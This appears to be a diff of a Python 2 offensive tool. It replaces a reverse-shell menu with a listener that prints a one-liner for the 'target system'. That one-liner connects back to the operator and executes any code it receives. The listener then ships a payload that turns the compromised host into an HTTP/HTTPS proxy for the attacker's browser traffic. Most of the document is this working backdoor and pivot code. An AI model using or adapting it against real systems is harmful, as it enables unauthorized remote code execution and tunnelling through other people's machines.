@@ -1,126 +1,95 @@
 #!/usr/bin/env python
 
-import threading
-from multiprocess import Process
-import socket, select, os, sys
 
-HOST = ''
-PROXY_TIMEOUT = 10 #seconds
-RSHELL_TIMEOUT = 30 #seconds
-processes = []
-
-global conn_proxy_in
-conn_proxy_in = [0]
-global conn_proxy_out
-conn_proxy_out = [0]
-global conn_rshell
-conn_rshell = [0]
-global server_rshell
-server_rshell = [0]
+import socket
+PHOST = '127.0.0.1'
+PPORT = 8080
 
 
-def proxy(flags):
-    socket_bind(server_proxy_out,l_port_proxy_out)
-    while running:
+
+def srv():
+    s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    while not 'LHOST' in locals() or not 'LPORT' in locals():
         try:
-            conn_proxy_out[0] = server_proxy_out[0].accept()[0]
-            conn_proxy_out[0].settimeout(PROXY_TIMEOUT)
-            data = conn_proxy_out[0].recv(14336)
-        except Exception as e:
-            print "[*] Hmm: %s\n" % str(e)
+            LHOST,LPORT = raw_input('Enter listener (IP:Port): ').split(':')
+            LPORT = int(LPORT)
+        except:
+            print "[*] Input must be in the form IP:PORT, (ex. 192.168.14.32:443)\n"
+    s2.bind(('0.0.0.0',LPORT))
+    print ("[*] Execute the following command on the target system" 
+                                " to establish the connection: \n ")
+    print ("python -c \"while True: import socket;s=socket.socket(socket.AF_INET,"
+                       "socket.SOCK_STREAM);s.connect(('%s',%s));exec(s.recv(100000));"
+                       "s.close();\"\n\n") % (LHOST,LPORT)
+    s2.listen(8)
+    if 1==2:
+        print "1==2"
+        c2, h = s2.accept()
+        print "[*] Connection from %s \n" % h[0]
+        c2.send("out='!';" + raw_input('>') + "s.send(out);")
+        data=c2.recv(1024)
+    if 1==1:
+        c2, h = s2.accept()
+        print "[*] Connection from %s \n" % h[0]
+
+        c2.send(simple_client)
+
+
+    s1.bind((PHOST,PPORT))
+    s1.listen(8)
+    print "[*] Set your browser proxy to %s:%s to proxy through the remote machine\n" % (PHOST, PPORT)
+        
+    while True:
+        c1 = s1.accept()[0]
+        data = c1.recv(1000000)
         if data:
             h = 'HTTP/1.1 200 OK\n'
             h += 'Content-Type: text/html; charset=utf-8'
             h += 'Connection: close\n\n'
             r = h + '<h1>No Response</h1>' 
             try:
-                conn_proxy_in[0].send(data)
-                r = conn_proxy_in[0].recv(14336) 
+                c2.send('proxy_this('+data+')')
+                r = c2.recv(1000000) 
 	    except Exception as e:   
                 r += '\n<pre>' + str(e) + '</pre>'            
-            conn_proxy_out[0].send(r)
-        conn_proxy_out[0].close()
-    server_proxy_out[0].close()
-    conn_proxy_in[0].close()
-    server_proxy_in[0].close()
-        
+            c1.send(r)
+        c1.close()
+    s1.close()
+                       
+                       
+                       
 
-def proxy_create():
-    global server_proxy_in
-    global server_proxy_out
-    global l_port_proxy_in
-    global l_port_proxy_out
-    server_proxy_in = ['foo']
-    server_proxy_out = ['bar'] 
-    try:
-        server_proxy_in[0] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_proxy_out[0] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        l_port_proxy_out = raw_input('Enter the port to proxy your browser traffic through: ')
-        l_port_proxy_in = raw_input('Enter the port to receive proxied responses from remote host: ')
-        l_port_proxy_out = int(l_port_proxy_out)
-        l_port_proxy_in = int(l_port_proxy_in)
-        ports = [l_port_proxy_out, l_port_proxy_in, l_port_rshell]
-        if '' in ports:
-            proxy_create()
-        elif len(ports) > len(set(ports)):
-            print "[*] Your reverse shell port and your two proxy ports must all be unique...\n"
-            proxy_create()
-    except Exception as e:
-        print "[*] Hmm: %s" % str(e)              
-    socket_bind(server_proxy_in,l_port_proxy_in)
-#    conn_rshell[0].send('PROXY '+ str(l_port_proxy_in)) 
-    socket_accept(server_proxy_in, conn_proxy_in)
-    conn_proxy_in[0].settimeout(PROXY_TIMEOUT)
-    flag = 'None'
-    p = Process(target=proxy,args=(flag,))
-    p.start()
-    processes.append(p)    
-
-def menu_create():
-    print 'making menu....\n'
-
-def socket_bind(server,port):
-    try:
-        server[0].bind((HOST, port))
-    except Exception as e:
-        print "[*] Hmm: %s \n" % str(e)
-    try:
-        server[0].listen(1)
-    except Exception as e:
-        print "[*] Hmm: %s \n" % str(e)
-
-def socket_accept(server, conn):
-    global r_proxy_addr
-    try:
-        conn[0], r_proxy_addr = server[0].accept()
-        print "[*] Proxy connection established with %s " % r_proxy_addr[0]
-    except Exception as e:
-        print "[*] Hmm: %s\n" % str(e)
-
-def menu(input):    
-    global running
-    running = True
-    while running:
-        cmd = raw_input("[*]" + str(hosts[0]) + " > ")
-        if cmd == "quit":
-            shutdown()
-        elif cmd == "proxy":
-            proxy_create()
-        else:
-            print "[*] Not Implemented: %s" % cmd
-
-def shutdown():
-    conn.close()
-    server.close()
-    running = False
+simple_client="""\r\n
+s.send('ACK!')\r\n
+def proxy_this(raw_request):\r\n
+    print raw_request\r\n
+    dx = raw_request.replace('\\n',' ').replace('\\r',' ').split(' ')\r\n
+    print "dddddddxxxxxxx: %s\\n" % dx\r\n 
+    try:\r\n 
+        host, host_ip = dx[dx.index('Host:')+1].strip().split(':')\r\n
+    except:\r\n
+        try:\r\n
+            host = dx[dx.index('Host:')+1].strip()\r\n
+            host_ip = 80\r\n
+        except:\r\n
+            host=None\r\n
+    if host:\r\n
+        print "HOOOOOOST: %s\\n" % host\r\n
+        host_ip = int(host_ip)\r\n
+        ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n
+        ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n
+        if host_ip == 443:\r\n
+            import ssl\r\n
+            ss = ssl.wrap_socket(ss)\r\n
+        ss.connect((host, host_ip))\r\n
+        ss.send(raw_request)\r\n
+        s.send(ss.recv(1000000))\r\n
+        ss.close()\r\n
+"""
 
 
-def main():
-    menu_create()
-    menu('')    
-    for proc in processes:
-        proc.join
-    sys.exit()
 
-main()
-
+srv()
